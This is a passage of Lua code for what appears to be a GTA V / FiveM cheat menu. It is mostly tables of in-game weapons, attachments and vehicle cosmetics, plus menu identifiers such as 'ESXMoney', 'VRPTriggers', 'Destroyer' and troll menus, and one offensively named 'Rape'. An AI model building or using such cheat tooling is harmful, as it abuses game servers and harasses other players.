Shotgun",bInfAmmo=false,mods={}}},AssaultRifles={AssaultRifle={id="weapon_assaultrifle",name="~r~> ~s~Assault Rifle",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_ASSAULTRIFLE_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_ASSAULTRIFLE_CLIP_02"},{name="~r~> ~s~Drum Magazine",id="COMPONENT_ASSAULTRIFLE_CLIP_03"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_MACRO"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP_02"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP"}}}},AssaultRifleMkII={id="weapon_assaultrifle_mk2",name="~r~> ~s~Assault Rifle Mk II",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_ASSAULTRIFLE_MK2_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_ASSAULTRIFLE_MK2_CLIP_02"},{name="~r~> ~s~Tracer Rounds",id="COMPONENT_ASSAULTRIFLE_MK2_CLIP_TRACER"},{name="~r~> ~s~Incendiary Rounds",id="COMPONENT_ASSAULTRIFLE_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Hollow Point Rounds",id="COMPONENT_ASSAULTRIFLE_MK2_CLIP_ARMORPIERCING"},{name="~r~> ~s~FMJ Rounds",id="COMPONENT_ASSAULTRIFLE_MK2_CLIP_FMJ"}},Sights={{name="~r~> ~s~Holograhpic Sight",id="COMPONENT_AT_SIGHTS"},{name="~r~> ~s~Small Scope",id="COMPONENT_AT_SCOPE_MACRO_MK2"},{name="~r~> ~s~Large Scope",id="COMPONENT_AT_SCOPE_MEDIUM_MK2"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},Barrel={{name="~r~> ~s~Default",id="COMPONENT_AT_AR_BARREL_01"},{name="~r~> ~s~Heavy",id="COMPONENT_AT_AR_BARREL_0"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP_02"},{name="~r~> ~s~Flat Muzzle Brake",id="COMPONENT_AT_MUZZLE_01"},{name="~r~> ~s~Tactical Muzzle Brake",id="COMPONENT_AT_MUZZLE_02"},{name="~r~> ~s~Fat-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_03"},{name="~r~> ~s~Precision Muzzle Brake",id="COMPONENT_AT_MUZZLE_04"},{name="~r~> ~s~Heavy Duty Muzzle Brake",id="COMPONENT_AT_MUZZLE_05"},{name="~r~> ~s~Slanted Muzzle Brake",id="COMPONENT_AT_MUZZLE_06"},{name="~r~> ~s~Split-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_07"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP_02"}}}},CarbineRifle={id="weapon_carbinerifle",name="~r~> ~s~Carbine Rifle",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_CARBINERIFLE_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_CARBINERIFLE_CLIP_02"},{name="~r~> ~s~Box Magazine",id="COMPONENT_CARBINERIFLE_CLIP_03"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_MEDIUM"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP"}}}},CarbineRifleMkII={id="weapon_carbinerifle_mk2",name="~r~> ~s~Carbine Rifle Mk II ",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_CARBINERIFLE_MK2_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_CARBINERIFLE_MK2_CLIP_02"},{name="~r~> ~s~Tracer Rounds",id="COMPONENT_CARBINERIFLE_MK2_CLIP_TRACER"},{name="~r~> ~s~Incendiary Rounds",id="COMPONENT_CARBINERIFLE_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Hollow Point Rounds",id="COMPONENT_CARBINERIFLE_MK2_CLIP_ARMORPIERCING"},{name="~r~> ~s~FMJ Rounds",id="COMPONENT_CARBINERIFLE_MK2_CLIP_FMJ"}},Sights={{name="~r~> ~s~Holograhpic Sight",id="COMPONENT_AT_SIGHTS"},{name="~r~> ~s~Small Scope",id="COMPONENT_AT_SCOPE_MACRO_MK2"},{name="~r~> ~s~Large Scope",id="COMPONENT_AT_SCOPE_MEDIUM_MK2"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},Barrel={{name="~r~> ~s~Default",id="COMPONENT_AT_CR_BARREL_01"},{name="~r~> ~s~Heavy",id="COMPONENT_AT_CR_BARREL_02"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP"},{name="~r~> ~s~Flat Muzzle Brake",id="COMPONENT_AT_MUZZLE_01"},{name="~r~> ~s~Tactical Muzzle Brake",id="COMPONENT_AT_MUZZLE_02"},{name="~r~> ~s~Fat-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_03"},{name="~r~> ~s~Precision Muzzle Brake",id="COMPONENT_AT_MUZZLE_04"},{name="~r~> ~s~Heavy Duty Muzzle Brake",id="COMPONENT_AT_MUZZLE_05"},{name="~r~> ~s~Slanted Muzzle Brake",id="COMPONENT_AT_MUZZLE_06"},{name="~r~> ~s~Split-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_07"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP_02"}}}},AdvancedRifle={id="weapon_advancedrifle",name="~r~> ~s~Advanced Rifle ",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_ADVANCEDRIFLE_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_ADVANCEDRIFLE_CLIP_02"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_SMALL"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP"}}}},SpecialCarbine={id="weapon_specialcarbine",name="~r~> ~s~Special Carbine",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_SPECIALCARBINE_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_SPECIALCARBINE_CLIP_02"},{name="~r~> ~s~Drum Magazine",id="COMPONENT_SPECIALCARBINE_CLIP_03"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_MEDIUM"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP_02"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP"}}}},SpecialCarbineMkII={id="weapon_specialcarbine_mk2",name="~r~> ~s~Special Carbine Mk II",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_SPECIALCARBINE_MK2_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_SPECIALCARBINE_MK2_CLIP_02"},{name="~r~> ~s~Tracer Rounds",id="COMPONENT_SPECIALCARBINE_MK2_CLIP_TRACER"},{name="~r~> ~s~Incendiary Rounds",id="COMPONENT_SPECIALCARBINE_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Hollow Point Rounds",id="COMPONENT_SPECIALCARBINE_MK2_CLIP_ARMORPIERCING"},{name="~r~> ~s~FMJ Rounds",id="COMPONENT_SPECIALCARBINE_MK2_CLIP_FMJ"}},Sights={{name="~r~> ~s~Holograhpic Sight",id="COMPONENT_AT_SIGHTS"},{name="~r~> ~s~Small Scope",id="COMPONENT_AT_SCOPE_MACRO_MK2"},{name="~r~> ~s~Large Scope",id="COMPONENT_AT_SCOPE_MEDIUM_MK2"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},Barrel={{name="~r~> ~s~Default",id="COMPONENT_AT_SC_BARREL_01"},{name="~r~> ~s~Heavy",id="COMPONENT_AT_SC_BARREL_02"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP_02"},{name="~r~> ~s~Flat Muzzle Brake",id="COMPONENT_AT_MUZZLE_01"},{name="~r~> ~s~Tactical Muzzle Brake",id="COMPONENT_AT_MUZZLE_02"},{name="~r~> ~s~Fat-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_03"},{name="~r~> ~s~Precision Muzzle Brake",id="COMPONENT_AT_MUZZLE_04"},{name="~r~> ~s~Heavy Duty Muzzle Brake",id="COMPONENT_AT_MUZZLE_05"},{name="~r~> ~s~Slanted Muzzle Brake",id="COMPONENT_AT_MUZZLE_06"},{name="~r~> ~s~Split-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_07"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP_02"}}}},BullpupRifle={id="weapon_bullpuprifle",name="~r~> ~s~Bullpup Rifle",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_BULLPUPRIFLE_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_BULLPUPRIFLE_CLIP_02"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_SMALL"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP"}}}},BullpupRifleMkII={id="weapon_bullpuprifle_mk2",name="~r~> ~s~Bullpup Rifle Mk II",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_BULLPUPRIFLE_MK2_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_BULLPUPRIFLE_MK2_CLIP_02"},{name="~r~> ~s~Tracer Rounds",id="COMPONENT_BULLPUPRIFLE_MK2_CLIP_TRACER"},{name="~r~> ~s~Incendiary Rounds",id="COMPONENT_BULLPUPRIFLE_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Armor Piercing Rounds",id="COMPONENT_BULLPUPRIFLE_MK2_CLIP_ARMORPIERCING"},{name="~r~> ~s~FMJ Rounds",id="COMPONENT_BULLPUPRIFLE_MK2_CLIP_FMJ"}},Sights={{name="~r~> ~s~Holograhpic Sight",id="COMPONENT_AT_SIGHTS"},{name="~r~> ~s~Small Scope",id="COMPONENT_AT_SCOPE_MACRO_02_MK2"},{name="~r~> ~s~Medium Scope",id="COMPONENT_AT_SCOPE_SMALL_MK2"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},Barrel={{name="~r~> ~s~Default",id="COMPONENT_AT_BP_BARREL_01"},{name="~r~> ~s~Heavy",id="COMPONENT_AT_BP_BARREL_02"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP"},{name="~r~> ~s~Flat Muzzle Brake",id="COMPONENT_AT_MUZZLE_01"},{name="~r~> ~s~Tactical Muzzle Brake",id="COMPONENT_AT_MUZZLE_02"},{name="~r~> ~s~Fat-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_03"},{name="~r~> ~s~Precision Muzzle Brake",id="COMPONENT_AT_MUZZLE_04"},{name="~r~> ~s~Heavy Duty Muzzle Brake",id="COMPONENT_AT_MUZZLE_05"},{name="~r~> ~s~Slanted Muzzle Brake",id="COMPONENT_AT_MUZZLE_06"},{name="~r~> ~s~Split-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_07"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP"}}}},CompactRifle={id="weapon_compactrifle",name="~r~> ~s~Compact Rifle",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_COMPACTRIFLE_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_COMPACTRIFLE_CLIP_02"},{name="~r~> ~s~Drum Magazine",id="COMPONENT_COMPACTRIFLE_CLIP_03"}}}}},LMG={MG={id="weapon_mg",name="~r~> ~s~MG",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_MG_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_MG_CLIP_02"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_SMALL_02"}}}},CombatMG={id="weapon_combatmg",name="~r~> ~s~Combat MG",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_COMBATMG_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_COMBATMG_CLIP_02"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_MEDIUM"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP"}}}},CombatMGMkII={id="weapon_combatmg_mk2",name="~r~> ~s~Combat MG Mk II",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_COMBATMG_MK2_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_COMBATMG_MK2_CLIP_02"},{name="~r~> ~s~Tracer Rounds",id="COMPONENT_COMBATMG_MK2_CLIP_TRACER"},{name="~r~> ~s~Incendiary Rounds",id="COMPONENT_COMBATMG_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Hollow Point Rounds",id="COMPONENT_COMBATMG_MK2_CLIP_ARMORPIERCING"},{name="~r~> ~s~FMJ Rounds",id="COMPONENT_COMBATMG_MK2_CLIP_FMJ"}},Sights={{name="~r~> ~s~Holograhpic Sight",id="COMPONENT_AT_SIGHTS"},{name="~r~> ~s~Medium Scope",id="COMPONENT_AT_SCOPE_SMALL_MK2"},{name="~r~> ~s~Large Scope",id="COMPONENT_AT_SCOPE_MEDIUM_MK2"}},Barrel={{name="~r~> ~s~Default",id="COMPONENT_AT_MG_BARREL_01"},{name="~r~> ~s~Heavy",id="COMPONENT_AT_MG_BARREL_02"}},BarrelAttachments={{name="~r~> ~s~Flat Muzzle Brake",id="COMPONENT_AT_MUZZLE_01"},{name="~r~> ~s~Tactical Muzzle Brake",id="COMPONENT_AT_MUZZLE_02"},{name="~r~> ~s~Fat-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_03"},{name="~r~> ~s~Precision Muzzle Brake",id="COMPONENT_AT_MUZZLE_04"},{name="~r~> ~s~Heavy Duty Muzzle Brake",id="COMPONENT_AT_MUZZLE_05"},{name="~r~> ~s~Slanted Muzzle Brake",id="COMPONENT_AT_MUZZLE_06"},{name="~r~> ~s~Split-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_07"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP_02"}}}},GusenbergSweeper={id="weapon_gusenberg",name="~r~> ~s~GusenbergSweeper",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_GUSENBERG_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_GUSENBERG_CLIP_02"}}}}},Snipers={SniperRifle={id="weapon_sniperrifle",name="~r~> ~s~Sniper Rifle",bInfAmmo=false,mods={Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_LARGE"},{name="~r~> ~s~Advanced Scope",id="COMPONENT_AT_SCOPE_MAX"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP_02"}}}},HeavySniper={id="weapon_heavysniper",name="~r~> ~s~Heavy Sniper",bInfAmmo=false,mods={Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_LARGE"},{name="~r~> ~s~Advanced Scope",id="COMPONENT_AT_SCOPE_MAX"}}}},HeavySniperMkII={id="weapon_heavysniper_mk2",name="~r~> ~s~Heavy Sniper Mk II",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_HEAVYSNIPER_MK2_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_HEAVYSNIPER_MK2_CLIP_02"},{name="~r~> ~s~Incendiary Rounds",id="COMPONENT_HEAVYSNIPER_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Armor Piercing Rounds",id="COMPONENT_HEAVYSNIPER_MK2_CLIP_ARMORPIERCING"},{name="~r~> ~s~FMJ Rounds",id="COMPONENT_HEAVYSNIPER_MK2_CLIP_FMJ"},{name="~r~> ~s~Explosive Rounds",id="COMPONENT_HEAVYSNIPER_MK2_CLIP_EXPLOSIVE"}},Sights={{name="~r~> ~s~Zoom Scope",id="COMPONENT_AT_SCOPE_LARGE_MK2"},{name="~r~> ~s~Advanced Scope",id="COMPONENT_AT_SCOPE_MAX"},{name="~r~> ~s~Nigt Vision Scope",id="COMPONENT_AT_SCOPE_NV"},{name="~r~> ~s~Thermal Scope",id="COMPONENT_AT_SCOPE_THERMAL"}},Barrel={{name="~r~> ~s~Default",id="COMPONENT_AT_SR_BARREL_01"},{name="~r~> ~s~Heavy",id="COMPONENT_AT_SR_BARREL_02"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_SR_SUPP_03"},{name="~r~> ~s~Squared Muzzle Brake",id="COMPONENT_AT_MUZZLE_08"},{name="~r~> ~s~Bell-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_09"}}}},MarksmanRifle={id="weapon_marksmanrifle",name="~r~> ~s~Marksman Rifle",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_MARKSMANRIFLE_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_MARKSMANRIFLE_CLIP_02"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP"}}}},MarksmanRifleMkII={id="weapon_marksmanrifle_mk2",name="~r~> ~s~Marksman Rifle Mk II",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_MARKSMANRIFLE_MK2_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_MARKSMANRIFLE_MK2_CLIP_02"},{name="~r~> ~s~Tracer Rounds",id="COMPONENT_MARKSMANRIFLE_MK2_CLIP_TRACER"},{name="~r~> ~s~Incendiary Rounds",id="COMPONENT_MARKSMANRIFLE_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Hollow Point Rounds",id="COMPONENT_MARKSMANRIFLE_MK2_CLIP_ARMORPIERCING"},{name="~r~> ~s~FMJ Rounds",id="COMPONENT_MARKSMANRIFLE_MK2_CLIP_FMJ	"}},Sights={{name="~r~> ~s~Holograhpic Sight",id="COMPONENT_AT_SIGHTS"},{name="~r~> ~s~Large Scope",id="COMPONENT_AT_SCOPE_MEDIUM_MK2"},{name="~r~> ~s~Zoom Scope",id="COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM_MK2"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},Barrel={{name="~r~> ~s~Default",id="COMPONENT_AT_MRFL_BARREL_01"},{name="~r~> ~s~Heavy",id="COMPONENT_AT_MRFL_BARREL_02"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP"},{name="~r~> ~s~Flat Muzzle Brake",id="COMPONENT_AT_MUZZLE_01"},{name="~r~> ~s~Tactical Muzzle Brake",id="COMPONENT_AT_MUZZLE_02"},{name="~r~> ~s~Fat-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_03"},{name="~r~> ~s~Precision Muzzle Brake",id="COMPONENT_AT_MUZZLE_04"},{name="~r~> ~s~Heavy Duty Muzzle Brake",id="COMPONENT_AT_MUZZLE_05"},{name="~r~> ~s~Slanted Muzzle Brake",id="COMPONENT_AT_MUZZLE_06"},{name="~r~> ~s~Split-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_07"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP_02"}}}}},Heavy={RPG={id="weapon_rpg",name="~r~> ~s~RPG",bInfAmmo=false,mods={}},GrenadeLauncher={id="weapon_grenadelauncher",name="~r~> ~s~Grenade Launcher",bInfAmmo=false,mods={}},GrenadeLauncherSmoke={id="weapon_grenadelauncher_smoke",name="~r~> ~s~Grenade Launcher Smoke",bInfAmmo=false,mods={}},Minigun={id="weapon_minigun",name="~r~> ~s~Minigun",bInfAmmo=false,mods={}},FireworkLauncher={id="weapon_firework",name="~r~> ~s~Firework Launcher",bInfAmmo=false,mods={}},Railgun={id="weapon_railgun",name="~r~> ~s~Railgun",bInfAmmo=false,mods={}},HomingLauncher={id="weapon_hominglauncher",name="~r~> ~s~Homing Launcher",bInfAmmo=false,mods={}},CompactGrenadeLauncher={id="weapon_compactlauncher",name="~r~> ~s~Compact Grenade Launcher",bInfAmmo=false,mods={}},Widowmaker={id="weapon_rayminigun",name="~r~> ~s~Widowmaker",bInfAmmo=false,mods={}}},Throwables={Grenade={id="weapon_grenade",name="~r~> ~s~Grenade",bInfAmmo=false,mods={}},BZGas={id="weapon_bzgas",name="~r~> ~s~BZ Gas",bInfAmmo=false,mods={}},MolotovCocktail={id="weapon_molotov",name="~r~> ~s~Molotov Cocktail",bInfAmmo=false,mods={}},StickyBomb={id="weapon_stickybomb",name="~r~> ~s~Sticky Bomb",bInfAmmo=false,mods={}},ProximityMines={id="weapon_proxmine",name="~r~> ~s~Proximity Mines",bInfAmmo=false,mods={}},Snowballs={id="weapon_snowball",name="~r~> ~s~Snowballs",bInfAmmo=false,mods={}},PipeBombs={id="weapon_pipebomb",name="~r~> ~s~Pipe Bombs",bInfAmmo=false,mods={}},Baseball={id="weapon_ball",name="~r~> ~s~Baseball",bInfAmmo=false,mods={}},TearGas={id="weapon_smokegrenade",name="~r~> ~s~Tear Gas",bInfAmmo=false,mods={}},Flare={id="weapon_flare",name="~r~> ~s~Flare",bInfAmmo=false,mods={}}},Misc={Parachute={id="gadget_parachute",name="~r~> ~s~Parachute",bInfAmmo=false,mods={}},FireExtinguisher={id="weapon_fireextinguisher",name="~r~> ~s~Fire Extinguisher",bInfAmmo=false,mods={}}}}
    local FirstJoinProper = false
    local near = false
    local closed = false
    local insideGarage = false
    local currentGarage = nil
    local insidePosition = {}
    local outsidePosition = {}
    local oldrot = nil
    local isPreviewing = false
    local oldmod = -1
    local oldmodtype = -1
    local previewmod = -1
    local oldmodaction = false
    local licencetype={{name="Blue on White 2",id=0},{name="Blue on White 3",id=4},{name="Yellow on Blue",id=2},{name="Yellow on Black",id=1},{name="North Yankton",id=5}}
    local headlightscolor={{name="Default",id=-1},{name="White",id=0},{name="Blue",id=1},{name="Electric Blue",id=2},{name="Mint Green",id=3},{name="Lime Green",id=4},{name="Yellow",id=5},{name="Golden Shower",id=6},{name="Orange",id=7},{name="Red",id=8},{name="Pony Pink",id=9},{name="Hot Pink",id=10},{name="Purple",id=11},{name="Blacklight",id=12}}
    local horns={["Stock Horn"]=-1,["Truck Horn"]=1,["Police Horn"]=2,["Clown Horn"]=3,["Musical Horn 1"]=4,["Musical Horn 2"]=5,["Musical Horn 3"]=6,["Musical Horn 4"]=7,["Musical Horn 5"]=8,["Sad Trombone Horn"]=9,["Classical Horn 1"]=10,["Classical Horn 2"]=11,["Classical Horn 3"]=12,["Classical Horn 4"]=13,["Classical Horn 5"]=14,["Classical Horn 6"]=15,["Classical Horn 7"]=16,["Scaledo Horn"]=17,["Scalere Horn"]=18,["Salemi Horn"]=19,["Scalefa Horn"]=20,["Scalesol Horn"]=21,["Scalela Horn"]=22,["Scaleti Horn"]=23,["Scaledo Horn High"]=24,["Jazz Horn 1"]=25,["Jazz Horn 2"]=26,["Jazz Horn 3"]=27,["Jazz Loop Horn"]=28,["Starspangban Horn 1"]=28,["Starspangban Horn 2"]=29,["Starspangban Horn 3"]=30,["Starspangban Horn 4"]=31,["Classical Loop 1"]=32,["Classical Horn 8"]=33,["Classical Loop 2"]=34}
    local neonColors={["White"]={255,255,255},["Blue"]={0,0,255},["Electric Blue"]={0,150,255},["Mint Green"]={50,255,155},["Lime Green"]={0,255,0},["Yellow"]={255,255,0},["Golden Shower"]={204,204,0},["Orange"]={255,128,0},["Red"]={255,0,0},["Pony Pink"]={255,102,255},["Hot Pink"]={255,0,255},["Purple"]={153,0,153}}
    local paintsClassic={{name="Black",id=0},{name="Carbon Black",id=147},{name="Graphite",id=1},{name="Anhracite Black",id=11},{name="Black Steel",id=2},{name="Dark Steel",id=3},{name="Silver",id=4},{name="Bluish Silver",id=5},{name="Rolled Steel",id=6},{name="Shadow Silver",id=7},{name="Stone Silver",id=8},{name="Midnight Silver",id=9},{name="Cast Iron Silver",id=10},{name="Red",id=27},{name="Torino Red",id=28},{name="Formula Red",id=29},{name="Lava Red",id=150},{name="Blaze Red",id=30},{name="Grace Red",id=31},{name="Garnet Red",id=32},{name="Sunset Red",id=33},{name="Cabernet Red",id=34},{name="Wine Red",id=143},{name="Candy Red",id=35},{name="Hot Pink",id=135},{name="Pfsiter Pink",id=137},{name="Salmon Pink",id=136},{name="Sunrise Orange",id=36},{name="Orange",id=38},{name="Bright Orange",id=138},{name="Gold",id=99},{name="Bronze",id=90},{name="Yellow",id=88},{name="Race Yellow",id=89},{name="Dew Yellow",id=91},{name="Dark Green",id=49},{name="Racing Green",id=50},{name="Sea Green",id=51},{name="Olive Green",id=52},{name="Bright Green",id=53},{name="Gasoline Green",id=54},{name="Lime Green",id=92},{name="Midnight Blue",id=141},{name="Galaxy Blue",id=61},{name="Dark Blue",id=62},{name="Saxon Blue",id=63},{name="Blue",id=64},{name="Mariner Blue",id=65},{name="Harbor Blue",id=66},{name="Diamond Blue",id=67},{name="Surf Blue",id=68},{name="Nautical Blue",id=69},{name="Racing Blue",id=73},{name="Ultra Blue",id=70},{name="Light Blue",id=74},{name="Chocolate Brown",id=96},{name="Bison Brown",id=101},{name="Creeen Brown",id=95},{name="Feltzer Brown",id=94},{name="Maple Brown",id=97},{name="Beechwood Brown",id=103},{name="Sienna Brown",id=104},{name="Saddle Brown",id=98},{name="Moss Brown",id=100},{name="Woodbeech Brown",id=102},{name="Straw Brown",id=99},{name="Sandy Brown",id=105},{name="Bleached Brown",id=106},{name="Schafter Purple",id=71},{name="Spinnaker Purple",id=72},{name="Midnight Purple",id=142},{name="Bright Purple",id=145},{name="Cream",id=107},{name="Ice White",id=111},{name="Frost White",id=112}}
    local paintsMatte={{name="Black",id=12},{name="Gray",id=13},{name="Light Gray",id=14},{name="Ice White",id=131},{name="Blue",id=83},{name="Dark Blue",id=82},{name="Midnight Blue",id=84},{name="Midnight Purple",id=149},{name="Schafter Purple",id=148},{name="Red",id=39},{name="Dark Red",id=40},{name="Orange",id=41},{name="Yellow",id=42},{name="Lime Green",id=55},{name="Green",id=128},{name="Forest Green",id=151},{name="Foliage Green",id=155},{name="Olive Darb",id=152},{name="Dark Earth",id=153},{name="Desert Tan",id=154}}
    local paintsMetal={{name="Brushed Steel",id=117},{name="Brushed Black Steel",id=118},{name="Brushed Aluminum",id=119},{name="Pure Gold",id=158},{name="Brushed Gold",id=159}}
    defaultVehAction = ""
    if GetVehiclePedIsUsing(PlayerPedId()) then
      veh = GetVehiclePedIsUsing(PlayerPedId())
    end

    local Enabled = true
    local LynxIcS = "discord.gg/5GMHtjKZ7F"
    local LynxIcZ = "discord.gg/5GMHtjKZ7F"
    local sMX = "Gracz"
    local sMXS = "Gracz"
    local VRPT = "VRPTriggers"
    local TRPM = "TeleportMenu"
    local WMPS = "WeaponMenu"
    local advm = "AdvM"
    local VMS = "VehicleMenu"
    local OPMS = "OnlinePlayerMenu"
    local espaa = "Serwery"
    local info = "Information"
    local RESO = "resources"
    local Ped = "Ped Menu"
    local Allserwers = "Allserwers"
    local poms = "PlayerOptionsMenu"
    local fivez = "FivezTrollMenu"
    local dddd = "Destroyer"
    local esms = "ESXMoney"
    local MSTC = "MiscTriggers"
    local cAoP = "CarOptions"
    local MTS = "MainTrailer"
    local mtsl = "MainTrailerSel"
    local espa = "ESPMenu"
    local CMSMS = "CsMenu"
    local gccccc = "GCT"
    local GAPA = "GlobalAllPlayers"
    local Tmas = "Trollmenu"
    local ESXC = "ESXCustom"
    local ESXD = "ESXDrugs"
    local SPD = "SpawnPeds"
    local RAPE = "Rape"
    local bmm = "BoostMenu"
    local GSWP = "GiveSingleWeaponPlayer"
    local WOP = "WeaponOptions"
    local CTS = "CarTypeSelection"
    local CTSmtsps = "MainTrailerSpa"
    local CTSa = "CarTypes"
    local MSMSA = "ModSelect"
    local WTSbull = "WeaponTypeSelection"
    local WTNe = "WeaponTypes"

    local function DrawTxt(text, x, y)
      SetTextFont(1)
      SetTextProportional(1)
      SetTextScale(0.0, 0.6)
      SetTextDropshadow(1, 0, 0, 0, 255)
      SetTextEdge(1, 0, 0, 0, 255)
      SetTextDropShadow()
      SetTextOutline()
